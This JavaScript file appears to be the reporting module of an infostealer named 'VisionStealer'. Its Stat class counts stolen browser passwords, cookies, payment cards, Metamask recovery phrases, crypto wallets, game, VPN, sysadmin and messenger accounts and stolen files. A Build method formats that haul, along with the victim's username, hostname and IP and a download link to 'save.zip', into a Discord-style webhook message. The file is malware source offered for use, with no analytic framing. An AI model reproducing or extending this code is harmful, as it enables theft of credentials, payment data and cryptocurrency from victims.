class Stat {
    constructor() {
        this.passwords = 0
        this.cookies = 0
        this.autofills = 0
        this.cards = 0
        this.history = 0
        this.downloads = 0
        this.bookmarks = 0
        this.games = []
        this.exodus = []
        this.keyword_password = []
        this.vpn = []
        this.sysadmin = []
        this.extensions = []
        this.colds = []
        this.mnemonics = []
        this.messengers = []
        this.file = []
     }

    AddBrowser(passwords, cookies, autofills, cards, history, downloads, bookmarks) {
        this.passwords = passwords
        this.cookies = cookies
        this.autofills = autofills
        this.cards = cards
        this.history = history
        this.downloads = downloads
        this.bookmarks = bookmarks
    }

    AddGames(name) {
        this.games.push(name)
    }

    Addfilestealer(name){
        this.file.push(name)
    }

    AddExodus(name) {
        this.exodus.push(name)
    }

    AddKeyword(name) {
        this.keyword_password.push(name)
    }

    AddVpn(name) {
        this.vpn.push(name)
    }

    AddSysAdmin(name) {
        this.sysadmin.push(name)
    }

    AddExtensions(name) {
        this.extensions.push(name)
    }

    AddColds(name) {
        this.colds.push(name)
    }

    AddPassphrase(passphrase) {
        this.passphrase = passphrase
    }

    AddMessenger(name) {
        this.messengers.push(name)
    }

    Build(username, hostname, ip, link) {
        var build = "\\nSuccesfully recover :\\n"
        build += "<:exodus:1114353672483254282> **" + this.exodus.length + " Exodus Password** (" + this.exodus + ")\\n"
        build += "⚔️ **" + this.keyword_password.length +" Keyword ** ( " + this.keyword_password + " )\\n"
        build += "<:metamask:1114538643101593730> **" + this.passphrase.length + " Metamask Recovery Key** ( " + this.passphrase.join(", ") + " )\\n"
        build += "<:coldwallet:1114538676714754078> **" + this.extensions.length + " Extension Wallets** ( " + this.extensions.join(", ") + " )\\n"
        build += "<:extension:1114538741898420334> **" + this.colds.length + " Cold Wallets** ( " + this.colds.join(", ") + " )\\n"
        build += "📁 **" + this.file + " Files **\\n"
        build += "<:key:1057640335393706014> **" + this.passwords + " Passwords**\\n"
        build += "<:cookies:1114538815189692506> **" + this.cookies + " Cookies**\\n"
        build += "<a:gmail:1037749724138197042> **" + this.cards + " Cards**\\n"
        build += "<:game:1114538708276871280> **" + this.games.length + " Games** ( " + this.games.join(", ") + " )\\n"
        build += "<:star:1057641404010090496> **" + this.sysadmin.length + " SysAdmin** ( " + this.sysadmin.join(", ") + " )\\n"
        build += "<:messengers:1040969477384310794> **" + this.messengers.length + " Messengers** ( " + this.messengers.join(", ") + " )\\n"
        build += "<a:internet:1038592743242477590> **" + this.vpn.length + " VPN** ( " + this.vpn.join(", ") + " )\\n"
        build += "and much more in `save.zip`"
        if (link != "") {
            build += "\\n\\nDownload : " + link
        }
        return `{\n"content": null,\n"embeds": [\n{\n"title": "Thanks for using VisionStealer",\n"description": "` + build + `",\n"color": 3224376,\n"fields": [\n{\n"name": "Computer Username",\n"value": "` + username + `",\n"inline": true\n},\n{\n"name": "Hostname",\n"value": "` + hostname + `",\n"inline": true\n},\n{\n"name": "Ip",\n"value": "` + ip + `",\n"inline": true\n}\n],\n"author": {\n"name": "VisionStealer"\n}\n}\n],\n"username": "VisionStealer",\n"attachments": []\n}`
    }
}

var stat = new Stat()

module.exports = {
    stat
}